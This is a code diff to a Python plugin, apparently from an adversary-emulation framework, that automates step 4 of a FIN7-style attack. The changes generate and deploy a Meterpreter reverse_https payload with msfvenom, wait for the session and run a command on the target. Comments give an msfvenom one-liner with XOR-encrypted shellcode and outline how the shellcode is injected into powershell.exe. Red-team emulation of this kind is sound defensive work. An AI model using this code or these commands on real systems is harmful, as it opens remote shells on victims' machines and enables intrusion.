@@ -4,8 +4,7 @@
 
 from plugins.base.attack import AttackPlugin
 from app.interface_sfx import CommandlineColors
-from app.metasploit import MSFVenom
-import os
+from app.metasploit import MSFVenom, Metasploit
 
 
 class FIN7Plugin(AttackPlugin):
@@ -90,6 +89,10 @@ class FIN7Plugin(AttackPlugin):
             f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)
 
     def step4(self):
+        """ Create staging payload and inject it into powsershell.exe
+        https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
+
+        """
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
 
@@ -99,34 +102,47 @@ class FIN7Plugin(AttackPlugin):
         # Uploaded stager creates meterpreter shell (babymetal)
         # Generate payload:
 
-        payload_name = "clickme.exe"
-        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0])
-        venom.generate_payload(payload="windows/x64/meterpreter_reverse_tcp",
-                               architecture="x64",
-                               platform="windows",
-                               # lhost,
-                               format="exe",
-                               outfile=payload_name)
-        self.attacker_machine_plugin.get(payload_name, self.targets[0].get_machine_path_external())
-        src = os.path.join(self.targets[0].get_machine_path_external(), payload_name)
+        payload_name = "babymetal.exe"
+        payload_type = "windows/x64/meterpreter/reverse_https"
 
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Deploy babymetal replacement{CommandlineColors.ENDC}",
-            1)
-        self.targets[0].put(src, self.targets[0].get_playground())
-        if self.targets[0].get_playground() is not None:
-            pl = os.path.join(self.targets[0].get_playground(), payload_name)
-        else:
-            pl = payload_name
+        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps. For the proper steps see:
+        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
+        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
+        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
+        # -f C                : output is c code
+        # --encrypt xor       : xor encrypt the results
+        # --encrypt-key m     : the encryption key
+        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0], self.attack_logger)
+        venom.generate_and_deploy(payload=payload_type,
+                                  architecture="x64",
+                                  platform="windows",
+                                  lhost=self.attacker_machine_plugin.get_ip(),
+                                  format="exe",
+                                  outfile=payload_name)
 
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
-            1)
-        self.targets[0].remote_run(pl, disown=True)
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}", 1)
 
-        # adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
-        # powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
-        # powershell.exe loads shellcode into memory (received from C2 server) https://attack.mitre.org/techniques/T1573/
+        # TODO: Add shellcode code into C file, compile
+
+        # TODO. Call convertto_shellcode ps1 ( needs a windows attacker machine or powershell on the attacker !)
+        # sudo apt install powershell
+        # pwsh
+        # result is babymetal.dll
+
+        # TODO: convert to base64
+
+        # TODO: target already runs adb156.exe. This one gets the shellcode and decodes it.
+        # TODO: adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
+
+        # TODO: powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
+        # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
+        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1
+
+        # Todo: Wait for meterpreter here
+        metasploit = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
+        metasploit.start_exploit_stub_for_external_payload(payload=payload_type)
+        print("Got session, calling command")
+        print(metasploit.meterpreter_execute_on(["getuid"], self.targets[0]))
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
